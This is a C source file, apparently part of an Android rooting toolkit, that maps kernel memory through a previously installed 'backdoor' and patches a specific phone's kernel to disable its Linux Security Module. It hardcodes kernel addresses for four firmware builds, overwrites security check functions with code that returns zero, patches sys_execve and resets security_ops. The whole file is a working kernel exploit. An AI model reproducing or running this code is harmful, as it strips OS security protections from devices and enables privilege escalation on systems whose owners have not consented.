#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <sys/system_properties.h>
#define _LARGEFILE64_SOURCE
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>

#include "backdoor_mmap.h"

struct check_code_t {
  unsigned long int addr;
  const unsigned long int *expected;
};

struct patch_info_t {
  unsigned long int sec_restrict_uid;
  unsigned long int sec_check_execpath;
  unsigned long int sys_execve;
  unsigned long int security_ops;
  unsigned long int default_security_ops;
  const unsigned long int *patched_sys_execve;
};

#define BL_REL(pc,func)     (((func) - (pc) - 8) / 4)

#define VERNAME(NAME)       NAME##_MDI
#define reset_security_ops_address    0xc027ec94
#define default_security_ops_address  0xc0fa6804
#define security_ops_address          0xc1150630
#define sec_restrict_uid_address      0xc00859ac
#define sec_check_execpath_address    0xc0011550
#define sys_execve_address            0xc00116b0
#define _raw_read_lock_address        0xc07ff304
#define get_mm_exe_file_address       0xc0070fc8
#define getname_address               0xc013ec4c
#define do_execve_address             0xc013b1d0
#define putname_address               0xc013ec58
#include "unlock_sec_sc04e.h"

#define VERNAME(NAME)       NAME##_MF1
#define reset_security_ops_address    0xc027ecfc
#define default_security_ops_address  0xc0fa6844
#define security_ops_address          0xc1150670
#define sec_restrict_uid_address      0xc0085a14
#define sec_check_execpath_address    0xc0011550
#define sys_execve_address            0xc00116b0
#define _raw_read_lock_address        0xc07ff394
#define get_mm_exe_file_address       0xc0071020
#define getname_address               0xc013ecb4
#define do_execve_address             0xc013b238
#define putname_address               0xc013ecc0
#include "unlock_sec_sc04e.h"

#define VERNAME(NAME)       NAME##_MF2
#define reset_security_ops_address    0xc027eda8
#define default_security_ops_address  0xc0fa6844
#define security_ops_address          0xc1150670
#define sec_restrict_uid_address      0xc0085a10
#define sec_check_execpath_address    0xc0011550
#define sys_execve_address            0xc00116b0
#define _raw_read_lock_address        0xc07ff65c
#define get_mm_exe_file_address       0xc007101c
#define getname_address               0xc013ed60
#define do_execve_address             0xc013b2e4
#define putname_address               0xc013ed6c
#include "unlock_sec_sc04e.h"

#define VERNAME(NAME)       NAME##_MG2
#define reset_security_ops_address    0xc027edb0
#define default_security_ops_address  0xc0fa6844
#define security_ops_address          0xc1150670
#define sec_restrict_uid_address      0xc0085a10
#define sec_check_execpath_address    0xc0011550
#define sys_execve_address            0xc00116b0
#define _raw_read_lock_address        0xc07ff654
#define get_mm_exe_file_address       0xc007101c
#define getname_address               0xc013ed68
#define do_execve_address             0xc013b2ec
#define putname_address               0xc013ed74
#include "unlock_sec_sc04e.h"

static const unsigned long int return_zero[] = {
  0xe3a00000, //    MOV     R0, #$0
  0xe12fff1e, //    BX      LR
};

static bool
check_unlock_code(struct check_code_t *check_code, const char *version)
{
  unsigned long int *p;
  int pos;
  int len;
  bool ret = true;

  for (pos = 0; check_code[pos].addr; pos++) {
    p = backdoor_convert_to_mmaped_address((void *)check_code[pos].addr);

    for (len = 0; check_code[pos].expected[len]; len++) {
      ;
    }

    if (memcmp(p, check_code[pos].expected, len * sizeof (check_code[pos].expected[0])) != 0) {
      int i;

//      printf("kernel code didn't match at 0x%08x for %s!!\n", check_code[pos].addr, version);
      for (i = 0; i < len; i++) {
//        printf("  0x%08x -- 0x%08x\n", p[i], check_code[pos].expected[i]);
      }

//      printf("\n");

      ret = false;
    }
  }

  if (ret) {
    printf("kernel code matched for %s\n", version);
  }
  else {
    printf("kernel code didn't match for %s\n", version);
  }

  return ret;
}

static void
do_patch(const struct patch_info_t *info)
{
  unsigned long int *p;
  int len;

  p = backdoor_convert_to_mmaped_address((void *)info->sec_restrict_uid);
  memcpy(p, return_zero, sizeof return_zero);

  p = backdoor_convert_to_mmaped_address((void *)info->sec_check_execpath);
  memcpy(p, return_zero, sizeof return_zero);

  p = backdoor_convert_to_mmaped_address((void *)info->sys_execve);

  for (len = 0; info->patched_sys_execve[len]; len++) {
    ;
  }

  memcpy(p, info->patched_sys_execve, sizeof (info->patched_sys_execve) * len);

  p = backdoor_convert_to_mmaped_address((void *)info->security_ops);
  *p = info->default_security_ops;
}

static bool
do_unlock(void)
{
  bool ret = false;

  if (!backdoor_open_mmap()) {
    printf("Failed to mmap due to %s.\n", strerror(errno));
    printf("Run 'install_backdoor' first\n");

    return false;
  }

  if (check_unlock_code(check_code_MG2, "MG2")) {
    do_patch(&patch_info_MG2);
    ret = true;
  }

  if (!ret && check_unlock_code(check_code_MF2, "MF2")) {
    do_patch(&patch_info_MF2);
    ret = true;
  }

  if (!ret && check_unlock_code(check_code_MF1, "MF1")) {
    do_patch(&patch_info_MF1);
    ret = true;
  }

  if (!ret && check_unlock_code(check_code_MDI, "MDI")) {
    do_patch(&patch_info_MDI);
    ret = true;
  }

  backdoor_close_mmap();

  return ret;
}

int
main(int argc, char **argv)
{
  if (!do_unlock()) {
    printf("Failed to unlock LSM.\n");
    exit(EXIT_FAILURE);
  }

  exit(EXIT_SUCCESS);
}
/*
vi:ts=2:nowrap:ai:expandtab:sw=2
*/
